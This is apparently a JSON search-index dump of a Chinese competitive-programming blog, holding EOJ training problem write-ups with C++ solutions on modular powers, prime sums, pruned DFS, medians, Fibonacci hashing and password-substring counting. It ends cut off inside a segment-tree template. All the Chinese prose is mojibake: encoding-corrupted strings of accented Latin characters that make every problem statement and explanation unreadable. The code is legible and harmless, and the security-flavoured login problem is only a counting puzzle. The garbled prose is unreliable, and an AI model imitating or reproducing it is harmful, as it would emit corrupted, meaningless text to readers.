æ€»ä½“æ¥è¯´ä¸å¥½åšâ€¦â€¦ ä½†æ˜¯ç¡®å®ä¹Ÿä¸éš¾ã€‚ ","date":"2018-02-13","objectID":"/eoj-training/:1:0","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"A ç»™å®šæ­£æ•´æ•° nï¼Œkï¼Œæ±‚ $f(n,k)=\\sum^n_{i=1}i^k$ï¼Œç»“æœå¯¹ 19260817 å–æ¨¡ã€‚ 1 \u003c= n \u003c= 1e7, 0 \u003c= k \u003c= 1e9 æ—¶é™ 0.698sï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰ ä¸Šæ¥ç”¨æ‹‰æ ¼æœ—æ—¥æ’å€¼æ³•ç›´æ¥ WAã€‚ã€‚æ­£è§£å…¶å®æ¯”æƒ³è±¡çš„ç®€å•ã€‚å…ˆæ¬§æ‹‰ç­›å‡ºç´ æ•°ï¼Œå¯¹ç´ æ•°ç”¨å¿«é€Ÿå¹‚æ±‚å‡º $i^k$ å­˜èµ·æ¥ã€‚ç„¶åå¯¹åˆæ•°çš„ $i^k$ åªè¦ç”¨ç´ æ•°çš„ç»“æœæ±‚å°±å¯ä»¥äº†ã€‚ #include\u003cbits/stdc++.h\u003eusing namespace std; typedef long long ll; const int p = 19260817; const int maxn = 1e7+5; bool flag[maxn]; ll f[maxn], prime[maxn], n, k, cnt; inline ll pow_mod(ll a, ll b) { ll res = 1; while (b) { if (b \u0026 1) res = res * a % p; a = a * a % p; b \u003e\u003e= 1; } return res; } inline void sieve() { for (int i = 2; i \u003c= n; ++i) { if (!flag[i]) { prime[cnt++] = i; f[i] = pow_mod(i, k); } for (int j = 0; j \u003c cnt \u0026\u0026 i * prime[j] \u003c= n; ++j) { flag[i * prime[j]] = 1; f[i * prime[j]] = f[i] * f[prime[j]] % p; if (i % prime[j] == 0) break; } } } int main() { scanf(\"%lld%lld\", \u0026n, \u0026k); ll sum = 1; sieve(); for (ll i = 2; i \u003c= n; ++i) sum = (sum + f[i]) % p; printf(\"%lld\\n\", sum); return 0; } ","date":"2018-02-13","objectID":"/eoj-training/:1:1","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"B ç»™å‡ºä¸€ä¸ªé•¿åº¦ä¸º N çš„æ•´æ•°æ•°åˆ— Aï¼Œå¯¹äºè¿™ä¸ªæ•°åˆ—è¿›è¡Œä»»æ„å¤šæ“ä½œã€‚æ¯æ¬¡é€‰æ‹©ä¸€ä¸ªä»»æ„çš„æ•´æ•°ï¼Œå¹¶å°†ä»»æ„ P ä¸ªæ•°å­—åŠ ä¸Šè¿™ä¸ªæ•°å­—ã€‚è¾“å‡º YES æˆ– NOï¼Œè¡¨ç¤ºèƒ½å¦é€šè¿‡è¿™ç§æ–¹æ³•å°†è¿™ä¸ªæ•°åˆ—ä¸­æ¯ä¸ªæ•°å­—åŒæ—¶å˜æˆé›¶ã€‚ 1 â‰¤ P â‰¤ N â‰¤ 1e5, |Ai| \u003c= 1e6 ç»“è®ºé¢˜ã€‚æ˜¾ç„¶å½“ n==p æ—¶åªæœ‰æ‰€æœ‰æ•°å­—ç›¸ç­‰æ—¶æ‰æ˜¯ YESï¼›n\u003ep æ—¶ï¼Œæ•°å­—æ€»å’Œå¦‚æœæ˜¯ p çš„å€æ•°åˆ™ YESã€‚å…¶å®å‡­æ„Ÿè§‰å¯ä»¥æƒ³åˆ°ï¼šè¦æŠŠæ‰€æœ‰æ•°å­—å˜æˆ 0ï¼Œå’Œå¿…é¡»æ˜¯ p çš„å€æ•°ã€‚ä¸è¿‡ä¸¥æ ¼çš„è¯æ˜åˆ™æ˜¯å°†æ‰€æœ‰ n\u003ep çš„æƒ…å†µè½¬åŒ–ä¸º n==p+1 çš„æƒ…å†µã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; int n, p, i, tmp, sum; int main() { cin \u003e\u003e n \u003e\u003e p; if (n == p) { scanf(\"%d\", \u0026tmp); for (i = 1; i \u003c n; ++i) { scanf(\"%d\", \u0026sum); if (sum != tmp) break; } printf(\"%s\\n\", i == n ? \"YES\" : \"NO\"); }else { for (i = 0; i \u003c n; ++i) { scanf(\"%d\", \u0026tmp); sum += tmp; } printf(\"%s\\n\", sum % p ? \"NO\" : \"YES\"); } return 0; } ","date":"2018-02-13","objectID":"/eoj-training/:1:2","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"C ç»™ä»»æ„ä¸€ä¸ªå¤§äº 1 çš„æ­£æ•´æ•° N, è¾“å‡º N å¯ä»¥åˆ†è§£æˆæœ€å°‘å‡ ä¸ªè´¨æ•° (å¯ä»¥ç›¸åŒ) çš„å’Œã€‚ 2 â‰¤ N â‰¤ 1e15 æ®è¯´æ˜¯ Codeforces åŸé¢˜ã€‚ å¦‚æœæœ¬èº«æ˜¯è´¨æ•°é‚£ä¹ˆç›´æ¥è¾“å‡º 1ã€‚ è¿ç”¨å“¥å¾·å·´èµ«çŒœæƒ³ï¼Œä»»ä½•å¤§äº 2 çš„å¶æ•°å¯ä»¥è¢«åˆ†è§£ä¸ºä¸¤ä¸ªè´¨æ•°ä¹‹å’Œã€‚ä¹Ÿå°±æ˜¯å¶æ•°è¾“å‡º 2ã€‚ å¦‚æœ n æ˜¯å¥‡åˆæ•°ä½†è¿˜å¯ä»¥è¢«åˆ†è§£ä¸ºä¸¤ä¸ªè´¨æ•°ï¼Œé‚£åªå¯èƒ½æ˜¯ä¸€å¥‡ä¸€å¶ã€‚å¶è´¨æ•°åªèƒ½æ˜¯ 2ï¼Œä¹Ÿå°±æ˜¯è¯´ n-2 å¿…é¡»æ˜¯è´¨æ•°ã€‚ å…¶ä»–æƒ…å†µè¾“å‡º 3ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; typedef long long ll; ll n; inline bool isprime(ll m) { for (ll i = 2; i * i \u003c= m; ++i) if (!(m % i)) return 0; return 1; } int main() { cin \u003e\u003e n; if (n == 2) printf(\"1\\n\"); else if (!(n\u00261)) printf(\"2\\n\"); else if (isprime(n)) printf(\"1\\n\"); else if (isprime(n-2)) printf(\"2\\n\"); else printf(\"3\\n\"); return 0; } ","date":"2018-02-13","objectID":"/eoj-training/:1:3","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"D ç»™å‡º n ä¸ªæ­£æ•´æ•°ï¼Œé—®æœ‰å¤šå°‘ç§æ–¹æ³•åœ¨è¿™ n ä¸ªæ•°å­—çš„ä¸­å–å…¶ä¸­ä¸€äº›æ•°å­—ï¼Œä½¿å¾—è¿™äº›æ•°å­—ä¹‹å’Œè¶…è¿‡ kã€‚è‹¥ç­”æ¡ˆè¶…è¿‡ 20 000 000ï¼Œè¾“å‡º -1ã€‚ 1 â‰¤ n â‰¤ 1e4 1 â‰¤ ai â‰¤ 1e8 1 â‰¤ k â‰¤ 1e10 é™åºæ’åºï¼Œé¢„å¤„ç†å‰ç¼€å’Œï¼Œç„¶å dfs + å‰ªæã€‚ æœ€ä¼˜æ€§å‰ªæï¼šå¦‚æœå½“å‰å’Œå·²ç»å¤§äº k åˆ™å‰ªæï¼Œans è¦åŠ ä¸Š 2^(å‰©ä½™æ•°å­—ä¸ªæ•°)â€”â€”è¿™ä¸€æ­¥è¿˜å¯ä»¥å‰ªæï¼šç”±äº 2^25\u003e2e7ï¼Œæ‰€ä»¥ä¸€æ—¦å‰©ä½™æ•°å­—ä¸ªæ•°å¤§äºç­‰äº 25 ä¹Ÿå‰ªæã€‚ å¯è¡Œæ€§å‰ªæï¼šå¦‚æœå½“å‰å’ŒåŠ ä¸Šåé¢æ‰€æœ‰æ•°ï¼ˆç”¨å‰ç¼€å’Œï¼‰éƒ½ä¸å¤§äº k é‚£ä¹ˆå‰ªæã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; typedef long long ll; const int maxn = 1e4+5; int a[maxn], n, ans; bool flag; ll k, suma[maxn]; inline void dfs(int dep, ll sum) { if (flag || sum + suma[n]-suma[dep-1] \u003c= k) return; if (sum\u003e k) { n-dep+1 \u003e= 25 ? flag = 1 : ans += 1\u003c\u003c(n-dep+1); return; } dfs(dep+1, sum + a[dep]); dfs(dep+1, sum); } int main() { cin \u003e\u003e n \u003e\u003e k; for (int i = 1; i \u003c= n; ++i) scanf(\"%d\", a+i); sort(a+1, a+1+n, greater\u003cint\u003e()); for (int i = 1; i \u003c= n; ++i) suma[i] = suma[i-1] + a[i]; dfs(1, 0); printf(\"%d\\n\", flag ? -1 : ans); return 0; } ","date":"2018-02-13","objectID":"/eoj-training/:1:4","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"E ç»™å‡ºæ•´æ•°æ•°åˆ— ${an}$ï¼Œå¯¹æ•´ä¸ªæ•°åˆ—è¿›è¡Œå°½å¯èƒ½å°‘çš„æ¬¡æ•°æ“ä½œï¼Œæ¯æ¬¡æ“ä½œå¯ä»¥å°†æ•°åˆ—ä¸­ä»»æ„ä¸€é¡¹åŠ  1 æˆ–è€…å‡ 1ï¼Œä½¿å¾—æœ€ç»ˆçš„æ•°åˆ— $b_1,b_2,b_3,â€¦,b_n$ æ»¡è¶³å¯¹æ•°åˆ—ä¸­çš„ä»»ä¸€é¡¹ $b_i(i\u003e=2)$ï¼Œæœ‰ $b_i=b_{iâˆ’1}+i$ã€‚ æ±‚æœ€å°‘çš„æ“ä½œæ¬¡æ•°ã€‚1 â‰¤ n â‰¤ 1e5ï¼Œ1 â‰¤ $a_i$ â‰¤ 1e10 è®¾ ${c_n}={a_1,a_2-2,a_3-5,a_4-9â€¦}$ï¼Œè¿™é¢˜ç­‰ä»·äºæ±‚ $|c_1-x|+|c_2-x|+â€¦+|c_n-x|$ çš„æœ€å°å€¼ã€‚æ ¹æ®é«˜ä¸­å‡½æ•°çŸ¥è¯†ï¼Œ$x$ åº”è¯¥å– ${c_n}$ çš„ä¸­ä½æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬æ„é€ å‡º ${c_n}$ ç„¶åæ’ä¸‹åºå–ä¸­é—´ä¸‹æ ‡ï¼Œè¿™é¢˜å°±åšå®Œäº†â€¦â€¦ #include \u003cbits/stdc++.h\u003eusing namespace std; typedef long long ll; const int maxn = 1e5+5; ll a[maxn], b[maxn], ans; int n; inline ll fun(ll mid) { ll ret = 0; for (int i = 1; i \u003c= n; ++i) ret += abs(mid - a[i]); return ret; } int main() { cin \u003e\u003e n; b[2] = 2; for (int i = 3; i \u003c= n; ++i) b[i] = b[i-1] + i; for (int i = 1; i \u003c= n; ++i) { scanf(\"%lld\", a+i); a[i] -= b[i]; } sort(a+1, a+1+n); printf(\"%lld\\n\", fun(a[(n+1)\u003e\u003e1])); return 0; } ","date":"2018-02-13","objectID":"/eoj-training/:1:5","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"F å¯¹äºç»™å®šçš„æ•°å­—ä¸² $a_1,a_2,a_3,â€¦,a_n$ï¼Œæ¯æ¬¡å¯ä»¥è¿›è¡Œå¦‚ä¸‹æ“ä½œ: é€‰æ‹©ä¸€ä¸ªæ•° i (1 \u003c i \u003c n)ï¼Œå°† $a_i$ å˜æˆ $a_{i+1}+a_{iâˆ’1}âˆ’a_i$ã€‚é—®åœ¨ç»è¿‡ä»»æ„å¤šæ¬¡çš„æ“ä½œåï¼Œè¯¥æ•°åˆ—çš„æ•°å­—æ€»å’Œæœ€å°ä¸ºå¤šå°‘ï¼Ÿ 1 â‰¤ n â‰¤ 1e5ï¼Œ0 â‰¤ $a_i$ â‰¤ 1e10 ä»¤ $c_i=a_{i+1}-a_i$ï¼Œè¿™æ · c æ•°åˆ—æœ‰ n-1 é¡¹ã€‚æ³¨æ„åˆ°å¯¹ $a_i$ çš„æ“ä½œç­‰ä»·äºäº¤æ¢ $c_i$ ä¸ $c_{i+1}$ï¼Œé‚£ä¹ˆé€šè¿‡å°† c å‡åºæ’åºååæ„é€ å‡ºçš„ a æ•°åˆ—å°±æ˜¯æ€»å’Œæœ€å°çš„æ•°åˆ—å•¦ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; typedef long long ll; const int maxn = 1e5+5; ll a[maxn], c[maxn], sum; int main() { int n; cin \u003e\u003e n; for (int i = 0; i \u003c n; ++i) scanf(\"%lld\", a+i); for (int i = 0; i \u003c n-1; ++i) c[i] = a[i+1] - a[i]; sort(c, c + n-1); sum = a[0]; for (int i = 1; i \u003c n; ++i) { a[i] = a[i-1] + c[i-1]; sum += a[i]; } printf(\"%lld\\n\", sum); return 0; } ","date":"2018-02-13","objectID":"/eoj-training/:1:6","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"Week 3 ","date":"2018-02-13","objectID":"/eoj-training/:2:0","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"D n ä¸ªæ¤…å­ï¼Œc ç§é¢œè‰²æ’æˆä¸€åœˆï¼Œé—´éš” 1mã€‚éšæœºé€‰ä¸€ç§é¢œè‰²ï¼Œä½ è¦é©¬ä¸Šç§»åŠ¨åˆ°è¿™ç§é¢œè‰²çš„æ¤…å­ä¸Šï¼ˆåŸæœ¬é¢œè‰²ç›¸åŒåˆ™ä¸åŠ¨ï¼‰ã€‚æ±‚èµ°åŠ¨è·ç¦»çš„æœ€å°æœŸæœ›ï¼ˆè¾“å‡ºæœ€ç®€åˆ†æ•°ï¼‰ã€‚ 1 â‰¤ c â‰¤ n â‰¤ 1e6 æ®è¯´æš´åŠ›æ¨¡æ‹Ÿ + ä¼˜åŒ–ï¼ˆ$O(n^2)\\rightarrow O(nlogn)$ï¼Ÿï¼‰2.5s å†…å¯è¿‡â€¦â€¦ ä¸è¿‡è¿™é‡Œç”¨äº†ä¸€äº›æ•°å­¦çŸ¥è¯†ï¼Œå¤æ‚åº¦é™åˆ° $O(n)$ã€‚ é¦–å…ˆè‚¯å®šæ˜¯å¸¸è§„çš„ç¯æ‹†é“¾æ“ä½œï¼šå¤åˆ¶ä¸€ä»½æ”¾åˆ°åé¢å»ã€‚è¿™æ ·å°±å¯ä»¥è§„å®šæ­£æ–¹å‘ä¸ºå‘å³ï¼Œä»å·¦å¾€å³æ‰«æäº†ã€‚ è¦æ±‚å‡ºç­”æ¡ˆï¼Œå…³é”®åœ¨äºæ±‚å‡ºè¦åçš„è¿™ä¸ªä½ç½®ã€‚è¦æ±‚å‡ºè¿™ä¸ªä½ç½®ï¼Œæ— ç–‘éœ€è¦æ±‚å‡ºä½ç½® i åˆ°å„ä¸ªé¢œè‰²æ¤…å­çš„æœ€çŸ­æœŸæœ›è·ç¦»å’Œ $d(i)$ã€‚ è®¾ $D(i,k)$ ä¸ºæ¤…å­ i åˆ°é¢œè‰²ä¸º k çš„æ¤…å­çš„æœ€çŸ­æœŸæœ›è·ç¦»ã€‚å³ï¼š$$d(i)=\\sum_{k=1}^cD(i,k)$$ æˆ‘ä»¬å‘ç°ï¼Œå¯¹æ¯ä¸€ä¸ª kï¼Œ$D(i,k)$ æ˜¯ä¸€ä¸ªå…³äº i çš„åˆ†æ®µå‡½æ•°ï¼š i åœ¨è·ç¦»æœ€è¿‘çš„é¢œè‰²ä¸º k çš„æ¤…å­å·¦è¾¹ï¼Œåˆ™ i æ¯å³ç§»ä¸€æ¬¡ï¼Œç¦»è¯¥æ¤…å­çš„è·ç¦» - 1ï¼Œæ­¤æ—¶ $Dâ€™(i,k)=-1$ï¼› åŒç†ï¼Œi åœ¨è·ç¦»æœ€è¿‘çš„é¢œè‰²ä¸º k çš„æ¤…å­å³è¾¹ï¼Œåˆ™ i æ¯å³ç§»ä¸€æ¬¡ï¼Œç¦»è¯¥æ¤…å­çš„è·ç¦» + 1ï¼Œæ­¤æ—¶ $Dâ€™(i,k)=+1$ï¼› äºæ˜¯åœ¨ä¸­é—´æŸä¸ªæ—¶åˆ»ï¼Œæˆ‘ä»¬ç§»åŠ¨åˆ°äº†è¿™å¼ æ¤…å­ä¸Šï¼Œæ­¤æ—¶ $Dâ€™(i,k)=0$ï¼Œè¿™é‡Œæ˜¯å‡½æ•°çš„é©»ç‚¹ã€‚å†æ±‚ï¼ˆä¼ªï¼‰äºŒé˜¶å¯¼ï¼Œç”±äºä¸€é˜¶å¯¼åœ¨è¿™ä¸ªç‚¹ä» -1 å˜æˆäº† + 1ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºï¼ˆä¼ªï¼‰äºŒé˜¶å¯¼ $Dâ€™â€™(i,k)=+2$ã€‚ï¼ˆè¿™æ ·è®¾å®šäºŒé˜¶å¯¼æ˜¯ä¸ºäº†æ–¹ä¾¿åé¢æ±‚ä¸€é˜¶å¯¼å’Œç­”æ¡ˆï¼‰ å†è€ƒè™‘ä¸¤ä¸ªç›¸é‚»çš„åŒè‰²ï¼ˆkï¼‰æ¤…å­ï¼šå½“ç»è¿‡ä¸¤è€…ä¸­ç‚¹å‰ï¼Œæˆ‘ä»¬ç¦»å·¦è¾¹æ¤…å­çš„è·ç¦»å°äºç¦»å³è¾¹æ¤…å­çš„è·ç¦»ï¼Œåä¹‹äº¦ç„¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç»è¿‡ä¸¤è€…ä¸­ç‚¹æ—¶ï¼Œ$Dâ€™(i,k)$ ç”± + 1 å˜ä¸ºäº† - 1ï¼ˆä¸­é—´çš„æ¤…å­æ•°ä¸ºå¥‡æ—¶ï¼Œä¼šåœ¨ä¸­ç‚¹å¤„å˜ä¸º 0ï¼‰ã€‚ å› æ­¤ï¼Œéœ€è¦å¯¹ $\\text{ceil}((i+j)/2)$ å’Œ $\\text{floor}((i+j)/2)$ è¿™ä¸¤ä¸ªç‚¹ï¼ˆä¸­é—´çš„æ¤…å­æ•°ä¸ºå¥‡æ—¶ï¼Œä¸€ä¸ªç‚¹ï¼‰çš„äºŒé˜¶å¯¼åˆ†åˆ«å‡ 1ã€‚ ç»¼ä¸Šï¼ŒäºŒé˜¶å¯¼å¤„ç†å®Œæ¯•ã€‚å¯¹äºŒé˜¶å¯¼æ±‚å‰ç¼€å’Œå¹¶ä¸”æ¯é¡¹å‡ cï¼Œå¾—åˆ°ä¸€é˜¶å¯¼ã€‚å†å¯¹ä¸€é˜¶å¯¼æ±‚å‰ç¼€å’Œï¼ˆæ³¨æ„ç‰¹åˆ¤ï¼Œç¬¬ 0 ä¸ªä½ç½®å°±æ˜¯ -cï¼‰ï¼Œå¾—åˆ°æ¯ä¸ªä½ç½®çš„ $d(i)$ï¼Œæœ€åå–æœ€å°å€¼ï¼Œè¿™é¢˜å°±ç»ˆäºåšå®Œäº†â€¦â€¦ #include \u003cbits/stdc++.h\u003eusing namespace std; typedef long long ll; const int maxn = 2e6+5; int n, c, a[maxn], nxt[maxn]; ll d[maxn]; ll gcd(ll a, ll b) { return b ? gcd(b, a%b) : a; } int main() { cin \u003e\u003e n \u003e\u003e c; for (int i = 1; i \u003c= n; ++i) scanf(\"%d\", a+i); for (int i = n+1; i \u003c= (n\u003c\u003c1); ++i) a[i] = a[i-n]; n \u003c\u003c= 1; for (int i = n; i\u003e= 1; --i) { d[i] += 2; int \u0026j = nxt[a[i]]; if (j) { d[(i+j)\u003e\u003e1] -= 1; d[(i+j+1)\u003e\u003e1] -= 1; } j = i; } for (int i = 1; i \u003c= n; ++i) d[i] += d[i-1]; d[0] = -c; for (int i = 1; i \u003c= n; ++i) d[i] += -c; ll sum = 0; for (int i = 1; i \u003c= n; ++i) { int \u0026j = nxt[a[i]]; if (j) { sum += i; j = 0; } } ll ans = (ll)n * n; for (int i = 1; i \u003c= n; ++i) { sum += d[i-1]; if (sum \u003c ans) ans = sum; } ll g = gcd(ans, c); ans /= g; c /= g; printf(\"%lld/%d\\n\", ans, c); } ","date":"2018-02-13","objectID":"/eoj-training/:2:1","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"E EOJ çš„ç™»å½•ç³»ç»Ÿçˆ†å‡ºäº†ä¸€ä¸ªé‡å¤§é—®é¢˜ï¼Œå½“æ­£ç¡®çš„å¯†ç æ˜¯ä½ è¾“å…¥çš„å¯†ç çš„å­ä¸²æ—¶ï¼Œå°±å¯ä»¥æˆåŠŸç™»å½•ï¼ ä¾‹å¦‚ä½ çš„å¯†ç æ˜¯ abcï¼Œåˆ™ä½ è¾“å…¥ abccï¼Œaabcï¼Œç”šè‡³ dfjklsdfabcsdjfklï¼Œéƒ½å¯ä»¥æˆåŠŸç™»å½•ï¼ å‡ºç°äº†è¿™ä¹ˆå¤§çš„é—®é¢˜ï¼Œé‚£å°±ä¸€å®šè¦æœ‰äººæ¥èƒŒé”…ï¼Œç®¡ç†å‘˜ä»¬å¸Œæœ›åœ¨èƒŒé”…ä¹‹å‰å…ˆè¡¡é‡ä¸€ä¸‹é”…çš„å¤§å°ã€‚ ç°åœ¨æœ‰ä¸€ä»½ EOJ ç”¨æˆ·çš„å¯†ç è¡¨ï¼Œé‡Œé¢åŒ…å«äº† n ä¸ªç”¨æˆ·çš„å¯†ç ï¼Œç¬¬ i ä¸ªç”¨æˆ·çš„å¯†ç æ˜¯ pwdiã€‚æˆ‘ä»¬å®šä¹‰é”…çš„å¤§å°ä¸ºæ‰€æœ‰æœ‰åºå¯¹ (i,j) (iâ‰ j) çš„æ•°é‡ï¼Œä½¿å¾—ç”¨æˆ· i èƒ½å¤Ÿè¾“å…¥ä»–çš„å¯†ç  pwdi æˆåŠŸç™»é™†ç”¨æˆ· j çš„è´¦æˆ·ã€‚ æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦çŸ¥é“ï¼Œæœ‰å¤šå°‘æœ‰åºå¯¹ (i,j) (iâ‰ j) ä½¿å¾— pwdj æ˜¯ pwdi çš„å­ä¸²ã€‚ ç¬¬ 1 è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•° nï¼Œ1â‰¤nâ‰¤20 000ï¼Œè¡¨ç¤ºå¯†ç è¡¨ä¸­å¯†ç çš„æ•°é‡ã€‚ ç¬¬ 1+i (1â‰¤iâ‰¤n) è¡ŒåŒ…å«ä¸€ä¸ªé•¿åº¦ä¸è¶…è¿‡ 10 ä¸”ç”±å°å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤º pwdiã€‚ å› ä¸ºé•¿åº¦å¤ªçŸ­äº†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æšä¸¾å­ä¸²ï¼ˆæ¯ä¸ªå¯†ç æœ€å¤š 55 ä¸ªå­ä¸²ï¼‰ï¼Œhash ä¸€ä¸‹å­˜è¿› map é‡Œç»Ÿè®¡å­ä¸²çš„å‡ºç°æ¬¡æ•°ã€‚ç„¶åå¯¹äºæ¯ä¸ªå¯†ç ï¼Œè®¡ç®—å…¶åœ¨å­ä¸²ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚è®°å¾—è¦å‡å» nï¼Œå› ä¸ºæ¯ä¸ªå¯†ç ä¹Ÿä¸€å®šæ˜¯è‡ªå·±çš„å­ä¸²ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int maxn = 20005; typedef long long ll; ll SS[maxn]; set\u003cll\u003e S[maxn]; map\u003cll, int\u003e m; char s[15]; int n, ans, len; int main() { cin \u003e\u003e n; for (int i = 0; i \u003c n; ++i) { scanf(\"%s\", s); len = strlen(s); for (int j = 0; j \u003c len; ++j) { ll h = 0; for (int k = j; k \u003c len; ++k) { h = h * 29 + s[k]-'a'+1; S[i].insert(h); if (!j \u0026\u0026 k+1 == len) SS[i] = h; } } for (auto x: S[i]) ++m[x]; } for (int i = 0; i \u003c n; ++i) ans += m[SS[i]]; printf(\"%d\\n\", ans-n); return 0; } ","date":"2018-02-13","objectID":"/eoj-training/:2:2","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"Week 4 ","date":"2018-02-13","objectID":"/eoj-training/:3:0","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"D æœ‰ä¸€ä¸ªæ•°åˆ— $A_n$ï¼Œå…¶ä¸­ $A_1=1,A_2=2,A_{n+2}=A_{n+1}+A_n$ã€‚ ç»™ä½ ä¸€ä¸ªæ•°å­—ï¼Œé—®ä»–æ˜¯è¿™ä¸ªæ•°åˆ—çš„ç¬¬å‡ é¡¹ã€‚ æ¯è¡ŒåŒ…æ‹¬æ•°åˆ—ä¸­çš„ä¸€é¡¹ $A_k$ (kâ‰¤100000)ã€‚ æ€»è¡Œæ•° Tâ‰¤100ã€‚ çœ‹åˆ°æ ‡é¢˜ä»¥ä¸ºæ˜¯å¾ˆæ°´çš„é¢˜â€¦â€¦ å®é™…ä¸Šï¼Œæ–æ³¢é‚£å¥‘æ•°åˆ—çš„ 100000 é¡¹æ˜¯ä¸€ä¸ªè¶…å‡º long long èŒƒå›´çš„æ•°ï¼Œå› æ­¤ä¸€å¼€å§‹è€ƒè™‘ç”¨é«˜ç²¾åº¦ã€‚åæ¥å‘ç°æ•°æ®åŠ å¼ºäº†ï¼Œæ—¶é™å’Œå†…å­˜åˆæ¯”è¾ƒç´§ (å¡æ‰äº†æˆ‘çš„ python é¢„å¤„ç†ç®—æ³• \u0026\u0026 python æ»šåŠ¨æš´åŠ›ç®—æ³• \u0026\u0026 C++ é«˜ç²¾åº¦ + äºŒåˆ†æŸ¥æ‰¾ç®—æ³•)ï¼Œåªèƒ½ä½¿ç”¨ä¸€äº›æŠ€å·§ã€‚ ç±»ä¼¼ hashï¼Œç”¨ä¸€ä¸ªå¤§è´¨æ•°ï¼ˆæ¯”å¦‚ 19260817ï¼‰å°†æ–æ³¢é‚£å¥‘æ•°åˆ—çš„å„é¡¹ hash æ‰ï¼Œå†åˆ©ç”¨åŒä½™å®šç†æŸ¥æ‰¾ç­”æ¡ˆï¼Œå°±åšå®Œäº†â€¦â€¦ï¼Ÿ #include \u003cbits/stdc++.h\u003eusing namespace std; const int maxn = 1e5+5; const int p = 19260817; int now, f[maxn]; map\u003cint, int\u003e m; string s; int main() { f[0] = f[1] = 1; m[1] = 1; for (int i = 2; i \u003c maxn; ++i) { f[i] = (f[i-1] + f[i-2]) % p; m[f[i]] = i; } while (cin\u003e\u003e s) { now = 0; for (auto \u0026i: s) now = (now*10 + i-'0') % p; printf(\"%d\\n\", m[now]); } return 0; } ","date":"2018-02-13","objectID":"/eoj-training/:3:1","tags":["æ•°å­¦","å¿«é€Ÿå¹‚","æœç´¢","Hash"],"title":"EOJ æ–°ç”Ÿè®­ç»ƒ","uri":"/eoj-training/"},{"categories":["ç®—æ³•"],"content":"å…¨æ˜¯ä¸å¤ªç†Ÿçš„æ¨¡æ¿ã€‚ ","date":"2018-02-05","objectID":"/templates/:0:0","tags":["çº¿æ®µæ ‘","æœ€å¤§åŒºé—´å’Œ","çŸ©é˜µ","é«˜ç²¾åº¦","å›¾è®º","å­—ç¬¦ä¸²","æœç´¢","æ•°å­¦","æ¨¡ç‰ˆ"],"title":"OJ å¸¸ç”¨çš„æ¨¡æ¿ä»¬","uri":"/templates/"},{"categories":["ç®—æ³•"],"content":"çº¿æ®µæ ‘ (EOJ 2525) æœ‰ n ä¸ªç¯ï¼Œm æ¬¡æ“ä½œï¼Œ0 è¡¨ç¤ºä¸€æ®µåŒºé—´å†…ç¯çš„çŠ¶æ€å…¨éƒ¨åè½¬ï¼Œ1 è¡¨ç¤ºè¯¢é—®ä¸€æ®µåŒºé—´å†…äº®ç€çš„ç¯çš„æ•°é‡ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int maxn = 1e5+5; int st[maxn\u003c\u003c2], add[maxn\u003c\u003c2], n, m, flag, s, e; void pushdown(int rt, int l, int r) { int mid = (l+r) \u003e\u003e 1; st[rt\u003c\u003c1] = mid-l+1 - st[rt\u003c\u003c1]; st[rt\u003c\u003c1|1] = r-mid - st[rt\u003c\u003c1|1]; add[rt\u003c\u003c1] ^= add[rt]; add[rt\u003c\u003c1|1] ^= add[rt]; add[rt] = 0; } void update(int rt, int s, int e, int l, int r) { if (s \u003c= l \u0026\u0026 r \u003c= e) { st[rt] = r-l+1 - st[rt]; add[rt] ^= 1; return; } int mid = (l+r) \u003e\u003e 1; if (add[rt]) pushdown(rt, l, r); if (s \u003c= mid) update(rt\u003c\u003c1, s, e, l, 